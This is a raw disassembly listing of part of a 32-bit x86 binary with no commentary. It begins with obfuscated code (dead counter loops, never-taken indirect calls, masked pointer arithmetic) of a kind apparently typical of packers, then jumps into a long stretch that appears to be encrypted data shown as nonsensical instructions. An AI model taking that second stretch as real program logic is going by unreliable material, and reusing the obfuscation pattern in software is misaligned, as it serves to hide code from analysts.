  42d543:	xor    eax,eax
  42d545:	lea    eax,[ebp-0x4]
  42d548:	adc    DWORD PTR ds:0x43777f,0x7eae
  42d552:	mov    DWORD PTR [ebp-0x18],eax
  42d555:	mov    eax,DWORD PTR [ebp-0x18]
  42d558:	or     ecx,DWORD PTR ds:0x437727
  42d55e:	mov    eax,DWORD PTR [eax]
  42d560:	xor    ecx,ecx
  42d562:	xor    ecx,DWORD PTR ds:0x4377cb
  42d568:	mov    ecx,DWORD PTR [ecx]
  42d56a:	add    DWORD PTR ds:0x43778f,ecx
  42d570:	mov    ecx,DWORD PTR [ebp-0x4]
  42d573:	sub    eax,ecx
  42d575:	mov    ecx,DWORD PTR [ebp-0x18]
  42d578:	mov    DWORD PTR ds:0x437717,0x6eff
  42d582:	mov    DWORD PTR [ecx],eax
  42d584:	xor    eax,DWORD PTR ds:0x43771f
  42d58a:	mov    eax,DWORD PTR [ebp-0x18]
  42d58d:	dec    DWORD PTR ds:0x437737
  42d593:	mov    eax,DWORD PTR [eax]
  42d595:	inc    ecx
  42d596:	xor    eax,0xf89cb5b0
  42d59b:	mov    ecx,DWORD PTR [ebp-0x18]
  42d59e:	adc    DWORD PTR ds:0x43772b,0x999
  42d5a8:	mov    DWORD PTR [ecx],eax
  42d5aa:	mov    DWORD PTR ds:0x437753,0x18
  42d5b4:	cmp    DWORD PTR ds:0x437753,0x0
  42d5bb:	je     0x42d600
  42d5c1:	cmp    DWORD PTR ds:0x437753,0x21
  42d5c8:	jb     0x42d600
  42d5ce:	jmp    0x42d5ec
  42d5d3:	push   0x76ac
  42d5d8:	push   0x2657
  42d5dd:	push   DWORD PTR [ebp-0x14]
  42d5e0:	push   DWORD PTR [ebp-0x28]
  42d5e3:	push   DWORD PTR [ebp-0x24]
  42d5e6:	call   DWORD PTR ds:0x43c9a0
  42d5ec:	xor    ecx,ecx
  42d5ee:	or     ecx,DWORD PTR ds:0x437753
  42d5f4:	dec    ecx
  42d5f5:	mov    DWORD PTR ds:0x437753,ecx
  42d5fb:	jmp    0x42d5b4
  42d600:	lea    eax,[ebp-0x8]
  42d603:	mov    DWORD PTR ds:0x437787,0x1b
  42d60d:	cmp    DWORD PTR ds:0x437787,0x0
  42d614:	je     0x42d64e
  42d61a:	cmp    DWORD PTR ds:0x437787,0x23
  42d621:	jl     0x42d64e
  42d627:	jmp    0x42d63a
  42d62c:	push   0x8dd4
  42d631:	push   DWORD PTR [ebp-0x18]
  42d634:	call   DWORD PTR ds:0x43c9a4
  42d63a:	xor    ecx,ecx
  42d63c:	xor    ecx,DWORD PTR ds:0x437787
  42d642:	dec    ecx
  42d643:	mov    DWORD PTR ds:0x437787,ecx
  42d649:	jmp    0x42d60d
  42d64e:	mov    DWORD PTR [ebp-0x14],eax
  42d651:	not    eax
  42d653:	mov    eax,DWORD PTR [ebp-0x14]
  42d656:	xor    DWORD PTR ds:0x43774b,ecx
  42d65c:	mov    eax,DWORD PTR [eax]
  42d65e:	xor    DWORD PTR ds:0x43779b,edi
  42d664:	mov    ecx,DWORD PTR [ebp-0x8]
  42d667:	neg    DWORD PTR ds:0x4377b3
  42d66d:	sub    eax,ecx
  42d66f:	and    ecx,DWORD PTR ds:0x43775f
  42d675:	mov    ecx,DWORD PTR [ebp-0x14]
  42d678:	mov    DWORD PTR [ecx],eax
  42d67a:	adc    eax,DWORD PTR ds:0x43771b
  42d680:	mov    eax,DWORD PTR [ebp-0x14]
  42d683:	mov    DWORD PTR ds:0x437757,0x10
  42d68d:	cmp    DWORD PTR ds:0x437757,0x0
  42d694:	je     0x42d6d0
  42d69a:	cmp    DWORD PTR ds:0x437757,0x12
  42d6a1:	jge    0x42d6d0
  42d6a7:	jmp    0x42d6bc
  42d6ac:	push   0x155c
  42d6b1:	push   0x7a14
  42d6b6:	call   DWORD PTR ds:0x43c9a8
  42d6bc:	xor    ecx,ecx
  42d6be:	xor    ecx,DWORD PTR ds:0x437757
  42d6c4:	dec    ecx
  42d6c5:	mov    DWORD PTR ds:0x437757,ecx
  42d6cb:	jmp    0x42d68d
  42d6d0:	mov    eax,DWORD PTR [eax]
  42d6d2:	and    DWORD PTR ds:0x43775b,0x0
  42d6dc:	xor    ecx,ecx
  42d6de:	or     ecx,DWORD PTR ds:0x43775b
  42d6e4:	inc    ecx
  42d6e5:	mov    DWORD PTR ds:0x43775b,ecx
  42d6eb:	cmp    DWORD PTR ds:0x43775b,0x1e
  42d6f2:	jb     0x42d71a
  42d6f8:	jmp    0x42d70d
  42d6fd:	push   0x43775b
  42d702:	push   0x3fc2
  42d707:	call   DWORD PTR ds:0x43c9ac
  42d70d:	cmp    DWORD PTR ds:0x43775b,0x14
  42d714:	jb     0x42d6dc
  42d71a:	or     eax,0xf89f05b0
  42d71f:	and    DWORD PTR ds:0x437763,0x0
  42d729:	mov    ecx,DWORD PTR ds:0x437763
  42d72f:	inc    ecx
  42d730:	mov    DWORD PTR ds:0x437763,ecx
  42d736:	cmp    DWORD PTR ds:0x437763,0x1d
  42d73d:	jg     0x42d763
  42d743:	jmp    0x42d756
  42d748:	push   DWORD PTR [ebp-0x24]
  42d74b:	push   0x79a8
  42d750:	call   DWORD PTR ds:0x43c9b0
  42d756:	cmp    DWORD PTR ds:0x437763,0x12
  42d75d:	jb     0x42d729
  42d763:	mov    ecx,DWORD PTR [ebp-0x14]
  42d766:	adc    DWORD PTR ds:0x43778f,0x4377ab
  42d770:	mov    DWORD PTR [ecx],eax
  42d772:	sub    ecx,DWORD PTR ds:0x43779f
  42d778:	lea    eax,[ebp-0x10]
  42d77b:	mov    DWORD PTR [ebp-0x8c],eax
  42d781:	and    DWORD PTR ds:0x437743,0x0
  42d78b:	mov    eax,ds:0x437743
  42d790:	inc    eax
  42d791:	mov    ds:0x437743,eax
  42d796:	cmp    DWORD PTR ds:0x437743,0x24
  42d79d:	jbe    0x42d7ca
  42d7a3:	jmp    0x42d7bd
  42d7a8:	push   0x43778f
  42d7ad:	push   0x43778f
  42d7b2:	push   0x7a81
  42d7b7:	call   DWORD PTR ds:0x43c9b4
  42d7bd:	cmp    DWORD PTR ds:0x437743,0x18
  42d7c4:	jb     0x42d78b
  42d7ca:	mov    eax,DWORD PTR [ebp-0x8c]
  42d7d0:	sub    DWORD PTR ds:0x437777,ecx
  42d7d6:	mov    eax,DWORD PTR [eax]
  42d7d8:	neg    ecx
  42d7da:	mov    ecx,DWORD PTR [ebp-0x10]
  42d7dd:	sub    DWORD PTR ds:0x43772f,0x437757
  42d7e7:	sub    eax,ecx
  42d7e9:	mov    ecx,DWORD PTR [ebp-0x8c]
  42d7ef:	mov    DWORD PTR [ecx],eax
  42d7f1:	mov    eax,DWORD PTR [ebp-0x8c]
  42d7f7:	mov    eax,DWORD PTR [eax]
  42d7f9:	or     eax,0xf89c85f0
  42d7fe:	mov    ecx,DWORD PTR [ebp-0x8c]
  42d804:	mov    DWORD PTR [ecx],eax
  42d806:	lea    eax,[ebp-0x24]
  42d809:	mov    DWORD PTR [ebp-0x34],eax
  42d80c:	mov    eax,DWORD PTR [ebp-0x34]
  42d80f:	mov    eax,DWORD PTR [eax]
  42d811:	mov    ecx,DWORD PTR [ebp-0x24]
  42d814:	sub    eax,ecx
  42d816:	mov    ecx,DWORD PTR [ebp-0x34]
  42d819:	mov    DWORD PTR [ecx],eax
  42d81b:	mov    eax,DWORD PTR [ebp-0x34]
  42d81e:	mov    eax,DWORD PTR [eax]
  42d820:	or     eax,0xf89c8590
  42d825:	jmp    0x42fbb7
  42d82a:	out    0xea,al
  42d82c:	sub    edx,DWORD PTR [ebx-0x1199adc9]
  42d832:	add    eax,0x34e63064
  42d837:	stos   DWORD PTR es:[edi],eax
  42d838:	test   eax,0x79f608d9
  42d83d:	jnp    0x42d82d
  42d83f:	cwde   
  42d840:	jnp    0x42d8bd
  42d842:	xlat   BYTE PTR ds:[ebx]
  42d843:	rol    BYTE PTR [ebx],0x4
  42d846:	jmp    0xcfc7:0x4d6f4f5
  42d84d:	(bad)  
  42d84f:	jmp    0x42d83d
  42d851:	mov    edi,0xece7e5e1
  42d856:	stc    
  42d857:	ror    edx,1
  42d859:	(bad)  
  42d85a:	in     al,dx
  42d85b:	iret   
  42d85c:	call   0xed15941f
  42d861:	lock (bad) 
  42d863:	jmp    edx
  42d865:	mov    ebp,0xe2dc02c4
  42d86a:	shr    cl,0x9
  42d86d:	push   cs
  42d86e:	icebp  
  42d86f:	enter  0xa5a9,0xb0
  42d873:	iret   
  42d874:	neg    bl
  42d876:	int    0xc4
  42d878:	repz jmp 0xee22ca34
  42d87e:	leave  
  42d87f:	lock shl cl,1
  42d882:	std    
  42d883:	sti    
  42d884:	fcmovnb st,st(5)
  42d886:	(bad)  
  42d887:	jmp    0x42d892
  42d889:	cli    
  42d88a:	(bad)  
  42d88b:	(bad)  
  42d88d:	ror    ebp,cl
  42d88f:	shl    ebx,1
  42d891:	lods   eax,DWORD PTR ds:[esi]
  42d892:	fidivr WORD PTR [ebp-0x3b393219]
  42d898:	stc    
  42d899:	call   ecx
  42d89b:	fdecstp 
  42d89d:	retf   
  42d89e:	cli    
  42d89f:	mov    esi,0xd502dddb
  42d8a4:	fcomp  st(1)
  42d8a6:	(bad)  
  42d8a7:	fld    DWORD PTR [ecx]
  42d8a9:	hlt    
  42d8aa:	shr    bh,0xc5
  42d8ad:	in     eax,dx
  42d8ae:	leave  
  42d8af:	lods   eax,DWORD PTR ds:[esi]
  42d8b0:	retf   0xedf3
  42d8b3:	rcl    ebp,0xe4
  42d8b6:	retf   
  42d8b7:	into   
  42d8b8:	clc    
  42d8b9:	xlat   BYTE PTR ds:[ebx]
  42d8ba:	enter  0xeac9,0xeb
  42d8be:	xlat   BYTE PTR ds:[ebx]
  42d8bf:	in     eax,dx
  42d8c0:	sti    
  42d8c1:	int3   
  42d8c2:	int3   
  42d8c3:	clc    
  42d8c4:	add    al,dl
  42d8c6:	loope  0x42d8cc
  42d8c8:	add    al,0xe
  42d8ca:	jecxz  0x42d896
  42d8cc:	or     ecx,ecx
  42d8ce:	or     dl,ah
  42d8d0:	jecxz  0x42d8b8
  42d8d2:	lods   al,BYTE PTR ds:[esi]
  42d8d3:	lock (bad) 
  42d8d5:	retf   
  42d8d6:	mov    ebx,0xd4e9b0f2
  42d8db:	mov    ebx,0xd7f8bef6
  42d8e0:	sti    
  42d8e1:	(bad)  
  42d8e3:	xlat   BYTE PTR ds:[ebx]
  42d8e4:	in     al,dx
  42d8e5:	add    eax,eax
  42d8e7:	jmp    0x42d8f1
  42d8e9:	call   0xe527a2d4
  42d8ee:	cli    
  42d8ef:	lods   eax,DWORD PTR ds:[esi]
  42d8f0:	lods   al,BYTE PTR ds:[esi]
  42d8f1:	ret    
  42d8f2:	fdivrp st(5),st
  42d8f4:	mov    ah,0xf5
  42d8f6:	loopne 0x42d8bc
  42d8f8:	(bad)  
  42d8f9:	out    0xd2,al
  42d8fb:	in     eax,0xcb
  42d8fd:	mov    esi,0xe2fdc103
  42d902:	mov    esp,0x70b07c6
  42d907:	shl    dl,0x7
  42d90a:	paddsb mm1,QWORD PTR [ecx]
  42d90d:	repnz jecxz 0x42d8b7
  42d910:	mov    eax,0xaac9e3c0
  42d915:	(bad)  
  42d916:	idiv   cl
  42d918:	mov    al,0xee
  42d91a:	mov    esi,0xdfd8edd8
  42d91f:	mov    ecx,0xd2f9d6f0
  42d924:	cld    
  42d925:	loopne 0x42d8ee
  42d927:	pop    es
  42d928:	leave  
  42d929:	cli    
  42d92a:	into   
  42d92b:	fsub   st,st(5)
  42d92d:	jmp    0xaf29bd39
  42d932:	out    0xd3,al
  42d934:	fdiv   QWORD PTR [ebp-0x33393a46]
  42d93a:	mov    ecx,0x3d8cadd
  42d93f:	mov    ecx,0xf3d0e7bc
  42d944:	sar    ebx,cl
  42d946:	rol    DWORD PTR [eax],0xc0
  42d949:	add    eax,0xffe8c70e
  42d94e:	add    DWORD PTR [ebx-0x504d424e],ebp
  42d954:	mov    bh,0xc3
  42d956:	out    0xc5,eax
  42d958:	loopne 0x42d955
  42d95a:	repnz mov ebp,0xbbffb1de
  42d960:	push   edx
  42d962:	out    0xd8,al
  42d964:	rol    eax,cl
  42d966:	icebp  
  42d967:	sti    
  42d968:	bswap  edx
  42d96a:	or     eax,ebp
  42d96c:	push   cs
  42d96d:	(bad)  
  42d96e:	int    0xbe
  42d970:	mov    al,0xcb
  42d973:	out    dx,eax
  42d974:	repz call 0xd6f5b33f
  42d97a:	lods   al,BYTE PTR ds:[esi]
  42d97b:	mov    ebp,0xdaffd2f7
  42d980:	cld    
  42d981:	loop   0x42d973
  42d983:	(bad)  
  42d984:	rol    edi,1
  42d986:	rcr    bl,0xd8
  42d989:	out    dx,eax
  42d98a:	call   0xf0fb25a
  42d98f:	mov    cl,0xf1
  42d991:	call   0xb736bf5e
  42d996:	lock mov bh,0xca
  42d999:	in     eax,dx
  42d99a:	out    dx,al
  42d99b:	std    
  42d99c:	aad    0xcb
  42d99e:	mov    eax,0xf0d9ddfe
  42d9a3:	mov    esp,0xf9fbf1c4
  42d9a8:	loopne 0x42d980
  42d9aa:	std    
  42d9ab:	jmp    0xf6c6:0xbef9f3e8
  42d9b2:	mov    esi,0xecb1edb0
  42d9b7:	fdiv   DWORD PTR [edx-0xc4b250f]
  42d9bd:	fistp  QWORD PTR [ebp-0xb0e0d09]
  42d9c3:	mov    esp,0xe7bcf406
  42d9c8:	(bad)  
  42d9c9:	enter  0xffdc,0x3
  42d9cd:	pop    es
  42d9ce:	(bad)  
  42d9d0:	in     al,dx
  42d9d1:	shr    BYTE PTR [eax+ebp*8-0x14491c2e],1
  42d9d8:	cli    
  42d9d9:	in     eax,dx
  42d9da:	(bad)  
  42d9db:	jmp    0x12ba8e3
  42d9e0:	loope  0x42d9c2
  42d9e2:	lock push es
  42d9e4:	(bad)  
  42d9e5:	loopne 0x42d9bf
  42d9e7:	fnstsw WORD PTR [esi-0x1f1f422]
  42d9ed:	add    eax,0xebe0f0ee
  42d9f2:	int    0xaf
  42d9f4:	mov    dh,0xcf
  42d9f6:	ror    edi,1
  42d9f8:	imul   bh
  42d9fa:	fdiv   st,st(4)
  42d9fc:	fucomp st(2)
  42d9fe:	mov    edi,0xc0d7f3e9
  42da03:	mul    ecx
  42da05:	std    
  42da06:	fisttp DWORD PTR [ebx]
  42da08:	pop    es
  42da09:	vpaddd ymm7,ymm2,ymm1
  42da0d:	loop   0x42da1e
  42da0f:	mov    bl,0xbf
  42da11:	mov    cl,0xa4
  42da13:	mov    al,0xad
  42da15:	int3   
  42da16:	mov    ch,0xe1
  42da18:	mov    al,0xca
  42da1a:	dec    ch
  42da1c:	stc    
  42da1d:	shl    ch,cl
  42da1f:	rol    BYTE PTR [ebx],1
  42da21:	sar    ebx,0xe5
  42da24:	fsubrp st(7),st
  42da26:	cld    
  42da27:	ret    0x10f
  42da2a:	add    eax,0xc0eb07da
  42da2f:	retf   0xe7cb
  42da32:	call   0xececd00d
  42da37:	icebp  
  42da38:	mov    ebx,0xbcfde5b0
  42da3d:	fadd   DWORD PTR [ecx]
  42da3f:	aad    0xfa
  42da41:	ret    0xf9ee
  42da44:	les    eax,FWORD PTR [esi]
  42da46:	push   es
  42da47:	pop    es
  42da48:	mul    dl
  42da4a:	out    0xef,eax
  42da4c:	add    eax,0xc9c801f9
  42da51:	test   eax,0xc6b6cac5
  42da56:	in     al,dx
  42da57:	out    0xc0,eax
  42da59:	jmp    0x42da20
  42da5b:	enter  0xf6bb,0xb8
  42da5f:	add    eax,ecx
  42da61:	aad    0xd2
  42da63:	fdivr  DWORD PTR [esi+0x6ca06dd]
  42da69:	out    dx,eax
  42da6a:	sti    
  42da6b:	cld    
  42da6c:	in     eax,0xc9
  42da6e:	in     al,dx
  42da6f:	scas   al,BYTE PTR es:[edi]
  42da70:	ret    
  42da71:	fistp  QWORD PTR [ebp-0xb4c0853]
  42da77:	retf   
  42da78:	mov    dl,0xbb
  42da7a:	into   
  42da7b:	shl    BYTE PTR [esp+ebx*8+0x100bbd8],1
  42da82:	repz aam 0xec
  42da85:	add    eax,0xe4ef0806
  42da8a:	out    0xd,al
  42da8c:	jmp    0xe8d0:0xdee9e4e1
  42da93:	mov    ch,0xb6
  42da95:	shl    edx,0xf4
  42da98:	in     al,0xfe
  42da9a:	(bad)
  42da9d:	aad    0xb9
  42da9f:	repnz sti 
  42daa1:	cli    
  42daa2:	sti    
  42daa3:	icebp  
  42daa4:	add    eax,0xdc00d7fa
  42daa9:	dec    BYTE PTR ds:0xed00f3e2
  42daaf:	in     al,dx
  42dab0:	call   0xb729c85d
  42dab5:	out    dx,al
  42dab6:	lods   al,BYTE PTR ds:[esi]
  42dab7:	(bad)  
  42dab9:	mov    cl,0xbb
  42dabb:	(bad)  
  42dabd:	sti    
  42dabe:	call   0x111d97f
  42dac3:	loope  0x42dacb
  42dac5:	ret    
  42dac6:	add    al,0xd0
  42dac8:	add    edi,ebp
  42daca:	or     al,ah
  42dacc:	out    0x2,eax
  42dace:	fsubp  st(7),st
  42dad0:	ret    
  42dad1:	repz mov esi,0xc6e7c3ee
  42dad7:	loopne 0x42daad
  42dad9:	(bad)  
  42dada:	jmp    0xddfc:0xd7baf4fe
  42dae1:	push   es
  42dae2:	hlt    
  42dae3:	stc    
  42dae4:	add    ah,bh
  42dae6:	dec    BYTE PTR [edx]
  42dae8:	jmp    0xcb4da2c4
  42daed:	jmp    0x42daed
  42daef:	(bad)  
  42daf0:	repnz (bad) 
  42daf3:	in     al,0xc5
  42daf5:	loop   0x42dadf
  42daf7:	mov    bh,0xdb
  42daf9:	mov    ebx,0xecd2dbb6
  42dafe:	mov    eax,0xe602d8e8
  42db03:	cmc    
  42db04:	loopne 0x42dad1
  42db06:	jmp    0xc94cbae9
  42db0b:	or     ebp,ebx
  42db0d:	sti    
  42db0e:	jmp    0xcfef:0xc1aee7e0
  42db15:	aad    0xcb
  42db17:	mov    cl,0xd7
  42db19:	enter  0xead2,0xfe
  42db1d:	mov    ch,0xed
  42db1f:	fcmove st,st(6)
  42db21:	out    0x7,al
  42db23:	jmp    edx
  42db25:	push   es
  42db26:	sti    
  42db27:	cli    
  42db28:	add    edx,ebp
  42db2a:	loope  0x42db13
  42db2c:	out    dx,al
  42db2d:	retf   
  42db2e:	call   0xd73684e5
  42db33:	int3   
  42db34:	lock loope 0x42daf2
  42db37:	out    dx,eax
  42db38:	repz (bad) 
  42db3a:	mov    esi,0xbbecd3d8
  42db3f:	hlt    
  42db40:	loopne 0x42db1d
  42db42:	add    eax,0xebd6f5fa
  42db47:	(bad)  
  42db48:	(bad)  
  42db49:	pop    es
  42db4a:	(bad)  
  42db4c:	fmulp  st(0),st
  42db4e:	loopne 0x42db21
  42db50:	mov    cl,0xb2
  42db52:	in     al,dx
  42db53:	ror    al,cl
  42db55:	rcl    cl,1
  42db57:	aad    0xb1
  42db59:	cli    
  42db5a:	fidiv  WORD PTR [edi-0x3246062b]
  42db60:	add    al,dl
  42db62:	cli    
  42db63:	(bad)  
  42db64:	aam    0xd0
  42db66:	in     eax,0x3
  42db68:	xlat   BYTE PTR ds:[ebx]
  42db69:	or     ah,dl
  42db6b:	cli    
  42db6c:	dec    dh
  42db6e:	adc    cl,bl
  42db70:	in     eax,0xf7
  42db72:	jmp    0xd7f0:0xf9e6f0d5
  42db79:	shl    DWORD PTR [eax-0x164b043c],1
  42db7f:	mov    edi,0xfb05f103
  42db84:	(bad)  
  42db86:	jecxz  0x42db68
  42db88:	jmp    0xf41ae661
  42db8d:	ror    ebp,cl
  42db8f:	in     eax,dx
  42db90:	xlat   BYTE PTR ds:[ebx]
  42db91:	test   ch,0xe2
  42db94:	xlat   BYTE PTR ds:[ebx]
  42db95:	lds    esi,FWORD PTR [edi-0x140b1709]
  42db9b:	retf   
  42db9c:	hlt    
  42db9d:	div    cl
  42db9f:	enter  0xbedd,0xc3
  42dba3:	ret    0xe5de
  42dba6:	clc    
  42dba7:	(bad)  
  42dba8:	retf   
  42dba9:	out    0xdf,al
  42dbab:	fdiv   st,st(3)
  42dbad:	in     al,dx
  42dbae:	iret   
  42dbaf:	mov    ecx,0xc2f0ecc1
  42dbb4:	into   
  42dbb5:	icebp  
  42dbb6:	test   ebx,0xc4d8d7f8
  42dbbc:	int3   
  42dbbd:	lock rcr eax,1
  42dbc0:	mov    esp,0xc7e006ef
  42dbc5:	icebp  
  42dbc6:	loop   0x42dbad
  42dbc8:	aam    0xe5
  42dbca:	ffreep st(4)
  42dbcc:	loop   0x42dbb7
  42dbce:	pop    es
  42dbcf:	stos   BYTE PTR es:[edi],al
  42dbd0:	iret   
  42dbd1:	icebp  
  42dbd2:	jecxz  0x42dbca
  42dbd4:	mov    ch,0xea
  42dbd7:	mov    al,0xb1
  42dbd9:	out    0xd0,al
  42dbdb:	(bad)  
  42dbdc:	int3   
  42dbdd:	clc    
  42dbde:	idiv   BYTE PTR [edi+esi*8+0x4def7d5]
  42dbe5:	fcomip st,st(2)
  42dbe7:	loop   0x42dbc6
  42dbe9:	jmp    0xeb44b9fc
  42dbee:	add    esi,ecx
  42dbf0:	(bad)  
  42dbf1:	out    dx,al
  42dbf2:	enter  0xaec6,0xd3
  42dbf6:	aam    0xd4
  42dbf8:	shl    DWORD PTR [edx+edx*8-0x3c15172b],cl
  42dbff:	icebp  
  42dc00:	loopne 0x42dbe3
  42dc02:	add    bh,dl
  42dc04:	mov    esp,0x9e0b8f5
  42dc09:	push   es
  42dc0a:	call   ebp
  42dc0c:	push   es
  42dc0d:	shr    edx,cl
  42dc0f:	jmp    0xd3b5:0xd4f7e2c1
  42dc16:	mov    cl,0xeb
  42dc18:	cli    
  42dc19:	jmp    0xcebd:0xb1ddf2c4
  42dc20:	lock (bad) 
  42dc23:	mov    edi,0x6d7d9c2
  42dc28:	fild   WORD PTR [edx]
  42dc2a:	loop   0x42dc10
  42dc2c:	in     al,dx
  42dc2d:	jmp    0xb4299c33
  42dc32:	jecxz  0x42dc21
  42dc34:	mov    bh,0xc5
  42dc36:	mov    al,0xe4
  42dc38:	(bad)  
  42dc3a:	icebp  
  42dc3b:	(bad)
  42dc3e:	fld    DWORD PTR [ebx]
  42dc40:	call   0xe705d23d
  42dc45:	(bad)  
  42dc46:	out    0xd7,al
  42dc48:	lock or bh,al
  42dc4b:	out    dx,al
  42dc4c:	or     ah,cl
  42dc4e:	loop   0x42dbff
  42dc50:	jmp    0xd4148906
  42dc55:	fidiv  DWORD PTR [edx-0x25311b4a]
  42dc5b:	stc    
  42dc5c:	out    dx,al
  42dc5d:	int    0xe2
  42dc5f:	in     al,dx
  42dc60:	std    
  42dc61:	stc    
  42dc62:	hlt    
  42dc63:	mov    esi,0xd609c600
  42dc68:	jmp    0xc908bf32
  42dc6d:	les    ecx,FWORD PTR [ecx]
  42dc6f:	mov    ecx,0xd6bce6ae
  42dc74:	out    dx,eax
  42dc75:	loope  0x42dc63
  42dc77:	iret   
  42dc78:	(bad)  [ecx+ecx*8-0x1161737]
  42dc7f:	add    bh,ch
  42dc81:	out    0xdc,eax
  42dc83:	mov    esp,0xe3fee0e1
  42dc88:	out    dx,eax
  42dc89:	hlt    
  42dc8a:	out    0xca,eax
  42dc8c:	add    ch,bh
  42dc8e:	bsr    esi,DWORD PTR [eax-0x1a08360a]
  42dc95:	(bad)  
  42dc96:	sti    
  42dc97:	sti    
  42dc98:	retf   
  42dc99:	in     al,0xff
  42dc9b:	call   0xf040c876
  42dca0:	shl    bh,1
  42dca2:	add    esi,ebp
  42dca4:	mul    bh
  42dca6:	faddp  st(3),st
  42dca8:	fiadd  DWORD PTR ds:0xe6c4e2df
  42dcae:	or     BYTE PTR [edi-0x2d294c1c],ch
  42dcb4:	sti    
  42dcb5:	jmp    0xcaf9:0xd5dad9d5
  42dcbc:	mov    edx,0xc0f6f9f2
  42dcc1:	aad    0xdb
  42dcc3:	cld    
  42dcc4:	shl    dl,1
  42dcc6:	cld    
  42dcc7:	loopne 0x42dc89
  42dcc9:	ror    BYTE PTR [ebx],0xe5
  42dccc:	fcmovu st,st(6)
  42dcce:	(bad)
  42dcd2:	xlat   BYTE PTR ds:[ebx]
  42dcd3:	out    0xd2,al
  42dcd5:	ret    
  42dcd6:	hlt    
  42dcd7:	repnz retf 0xb7ee
  42dcdb:	jmp    0x42dc9c
  42dcdd:	std    
  42dcde:	fadd   DWORD PTR [ecx]
  42dce0:	jecxz  0x42dcbc
  42dce2:	mov    ebp,0xeae4e00b
  42dce8:	cli    
  42dce9:	out    dx,al
  42dcea:	(bad)  
  42dceb:	psubusw mm7,mm7
  42dcee:	out    0xdc,al
  42dcf0:	in     eax,0xc5
  42dcf2:	fucom  st(4)
  42dcf4:	leave  
  42dcf5:	aad    0xe0
  42dcf7:	repz hlt 
  42dcf9:	rcl    bh,cl
  42dcfb:	hlt    
  42dcfc:	retf   0xdcec
  42dcff:	add    edx,eax
  42dd01:	aad    0xf6
  42dd03:	add    esi,edi
  42dd05:	(bad)  
  42dd07:	cld    
  42dd08:	ret    0xe6e5
  42dd0b:	into   
  42dd0c:	or     cl,dh
  42dd0e:	(bad)  
  42dd10:	loopne 0x42dcde
  42dd12:	scas   eax,DWORD PTR es:[edi]
  42dd13:	mov    dl,0xe3
  42dd15:	fndisi(8087 only) 
  42dd17:	call   0xda09b211
  42dd1c:	leave  
  42dd1d:	fnop   
  42dd1f:	out    dx,al
  42dd20:	mov    edi,0xe0f0dcbc
  42dd25:	(bad)  
  42dd26:	imul   ebx
  42dd28:	std    
  42dd29:	fmul   DWORD PTR [edi]
  42dd2b:	retf   0xf3
  42dd2e:	pop    es
  42dd2f:	jmp    0xeb2ea607
  42dd34:	jmp    0xd91ed32c
  42dd39:	shl    dl,cl
  42dd3b:	push   DWORD PTR [edx-0x3708221d]
  42dd41:	icebp  
  42dd42:	std    
  42dd43:	mov    ebp,0x7d7fcff
  42dd48:	out    dx,eax
  42dd49:	or     esp,esp
  42dd4b:	in     al,0x5
  42dd4d:	std    
  42dd4e:	into   
  42dd4f:	fmul   st,st(5)
  42dd51:	mov    esi,0xe5e2c3e5
  42dd56:	in     eax,0xf5
  42dd58:	mov    ah,0xec
  42dd5a:	clc    
  42dd5b:	xlat   BYTE PTR ds:[ebx]
  42dd5c:	in     al,0xd8
  42dd5e:	stc    
  42dd5f:	(bad)  
  42dd60:	shl    cl,cl
  42dd62:	in     al,dx
  42dd63:	xlat   BYTE PTR ds:[ebx]
  42dd64:	repnz (bad) 
  42dd66:	faddp  st(0),st
  42dd68:	add    ecx,DWORD PTR [eax]
  42dd6a:	clc    
  42dd6b:	(bad)  
  42dd6c:	call   DWORD PTR [edx]
  42dd6e:	add    bh,BYTE PTR [esi-0x371a0e22]
  42dd74:	shl    BYTE PTR [esp+ebp*4-0x450a3b0e],0xf0
  42dd7c:	out    dx,eax
  42dd7d:	mov    eax,0xedcdddca
  42dd82:	mov    esi,0xdbd3d201
  42dd87:	add    BYTE PTR [esi-0x143a3f22],bh
  42dd8d:	push   cs
  42dd8e:	out    0xc3,al
  42dd90:	leave  
  42dd91:	iret   
  42dd92:	shl    BYTE PTR [eax-0x271d2a52],0xe4
  42dd99:	fnstcw WORD PTR [ebx-0x362d1231]
  42dd9f:	in     eax,dx
  42dda0:	lock sar eax,1
  42dda3:	add    ebx,ebx
  42dda5:	(bad)  
  42dda6:	sti    
  42dda7:	jmp    0x42dd88
  42dda9:	sti    
  42ddaa:	loope  0x42dd81
  42ddac:	out    dx,al
  42ddad:	out    dx,eax
  42ddae:	call   0xc7f29d92
  42ddb3:	mov    bh,0xc5
  42ddb5:	int3   
  42ddb6:	aam    0xc0
  42ddb8:	in     eax,0xe9
  42ddba:	mov    ecx,0xf1d3d2b3
  42ddbf:	repz (bad) 
  42ddc1:	shl    ecx,1
  42ddc3:	imul   ah
  42ddc5:	ret    0xd8c6
  42ddc8:	fcmovu st,st(0)
  42ddca:	loop   0x42dd91
  42ddcc:	add    eax,0xddc4cecb
  42ddd1:	shr    BYTE PTR [esi-0x2a121611],cl
  42ddd7:	(bad)
  42ddda:	mov    esi,0xbcd7b6ff
  42dddf:	jmp    0xf133c49d
  42dde4:	stc    
  42dde5:	lock in al,0xf0
  42dde8:	retf   0xdbe1
  42ddeb:	sti    
  42ddec:	leave  
  42dded:	jmp    0x42ddee
  42ddef:	lods   eax,DWORD PTR ds:[esi]
  42ddf0:	jmp    0x42ddc9
  42ddf2:	scas   eax,DWORD PTR es:[edi]
  42ddf3:	(bad)  
  42ddf4:	out    0xd5,al
  42ddf6:	(bad)  
  42ddf7:	test   ch,0xf3
  42ddfa:	call   0xca12bcd2
  42ddff:	leave  
  42de00:	test   BYTE PTR [edi],0x2
  42de03:	out    0xf4,al
  42de05:	cmc    
  42de06:	lock (bad) 
  42de08:	hlt    
  42de09:	idiv   BYTE PTR [esp+edi*8-0x14012211]
  42de10:	in     eax,dx
  42de11:	repz ror dh,1
  42de14:	jmp    0xfbb9:0xb7d6c8d5
  42de1b:	not    ebp
  42de1d:	fcom   st(5)
  42de1f:	out    dx,eax
  42de20:	fucomi st,st(5)
  42de22:	mov    edi,0xdce5c2ed
  42de27:	rol    BYTE PTR [edi],0xf9
  42de2a:	jmp    0x847ecf5
  42de2f:	mov    bl,0xc2
  42de31:	out    0xbc,eax
  42de33:	in     eax,dx
  42de34:	call   0xd50f8f14
  42de39:	(bad)  
  42de3a:	sti    
  42de3b:	into   
  42de3c:	rcl    esi,cl
  42de3e:	fidivr DWORD PTR [edx-0x29270b38]
  42de44:	(bad)  
  42de46:	ret    
  42de47:	loopne 0x42de49
  42de49:	div    esi
  42de4b:	add    bh,dh
  42de4d:	std    
  42de4e:	clc    
  42de4f:	(bad)  
  42de50:	fsubr  st,st(6)
